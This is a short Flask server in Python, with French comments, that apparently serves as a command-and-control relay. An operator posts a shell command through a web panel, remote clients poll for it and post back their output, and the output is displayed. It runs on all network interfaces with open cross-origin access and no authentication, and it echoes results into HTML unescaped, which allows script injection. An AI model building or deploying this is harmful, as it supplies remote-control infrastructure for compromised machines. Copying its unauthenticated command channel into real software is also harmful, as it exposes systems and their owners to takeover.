from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # 🚀 Autoriser les requêtes depuis le panel GitHub Pages

command_to_execute = ""  # Stocke la commande en attente
result_output = ""  # Stocke le dernier résultat

@app.route("/command", methods=["GET", "POST"])
def handle_command():
    global command_to_execute
    if request.method == "POST":
        command_to_execute = request.form["command"]
        return "Commande reçue"
    return jsonify({"command": command_to_execute})

@app.route("/result", methods=["POST"])
def handle_result():
    global result_output
    result_output = request.form["output"]
    return "Résultat mis à jour"

@app.route("/view_result", methods=["GET"])
def view_result():
    return f"<pre>{result_output}</pre>"

@app.route('/panel')
def serve_panel():
    return send_from_directory('.', 'panel.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)  # 🔥 Accessible depuis partout
